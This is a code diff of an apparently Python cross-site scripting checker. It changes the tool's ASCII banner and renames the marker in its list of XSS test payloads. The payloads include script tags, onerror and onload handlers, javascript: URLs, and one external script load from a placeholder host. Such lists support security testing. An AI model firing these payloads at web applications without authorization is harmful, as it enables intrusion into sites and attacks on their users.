@@ -11,14 +11,16 @@ from queue import Queue
 
 print(
     Fore.RED +
+    
     """
-                                                                      
-,--.   ,--.          ,--.   ,--.  ,---.,------.           ,--.   ,--. 
- \  `.'  / ,--.  ,--.|   `.'   | /    ||  .-.  \,--.  ,--. \  `.'  /  
-  .'    \   \  `'  / |  |'.'|  |/  '  ||  |  \  :\  `'  /   .'    \   
- /  .'.  \  /  /.  \ |  |   |  |'--|  ||  '--'  //  /.  \  /  .'.  \  
-'--'   '--''--'  '--'`--'   `--'   `--'`-------''--'  '--''--'   '--'
-
+ /$$   /$$  /$$$$$$   /$$$$$$           /$$$$$$  /$$   /$$ /$$$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$ 
+| $$  / $$ /$$__  $$ /$$__  $$         /$$__  $$| $$  | $$| $$_____/ /$$__  $$| $$  /$$/| $$_____/| $$__  $$
+|  $$/ $$/| $$  \__/| $$  \__/        | $$  \__/| $$  | $$| $$      | $$  \__/| $$ /$$/ | $$      | $$  \ $$
+ \  $$$$/ |  $$$$$$ |  $$$$$$  /$$$$$$| $$      | $$$$$$$$| $$$$$   | $$      | $$$$$/  | $$$$$   | $$$$$$$/
+  >$$  $$  \____  $$ \____  $$|______/| $$      | $$__  $$| $$__/   | $$      | $$  $$  | $$__/   | $$__  $$
+ /$$/\  $$ /$$  \ $$ /$$  \ $$        | $$    $$| $$  | $$| $$      | $$    $$| $$\  $$ | $$      | $$  \ $$
+| $$  \ $$|  $$$$$$/|  $$$$$$/        |  $$$$$$/| $$  | $$| $$$$$$$$|  $$$$$$/| $$ \  $$| $$$$$$$$| $$  | $$
+|__/  |__/ \______/  \______/          \______/ |__/  |__/|________/ \______/ |__/  \__/|________/|__/  |__/
 
 
 
@@ -31,16 +33,16 @@ print()
 
 # Define the payloads
 payloads = [
-    "<script>alert('XxM4DxX')</script>",
-    "<img src=x onerror=alert('XxM4DxX')>",
-    "<a href=\"javascript:alert('XxM4DxX')\">Click me</a>",
-    "\"><script>alert('XxM4DxX')</script>",
-    "<input type=\"text\" value=\"XxM4DxX\" onfocus=\"alert('XxM4DxX')\">",
-    "<svg onload=alert('XxM4DxX')>",
-    "<a href=\"#\" onmouseover=\"alert('XxM4DxX')\">Hover me</a>",
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<a href=\"javascript:alert('XSS')\">Click me</a>",
+    "\"><script>alert('XSS')</script>",
+    "<input type=\"text\" value=\"XSS\" onfocus=\"alert('XSS')\">",
+    "<svg onload=alert('XSS')>",
+    "<a href=\"#\" onmouseover=\"alert('XSS')\">Hover me</a>",
     "<script src=\"http://example.com/xss.js\"></script>",
-    "<iframe src=\"javascript:alert('XxM4DxX');\"></iframe>",
-    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XxM4DxX');\">"
+    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
+    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">"
 ]
 
 # Output file path
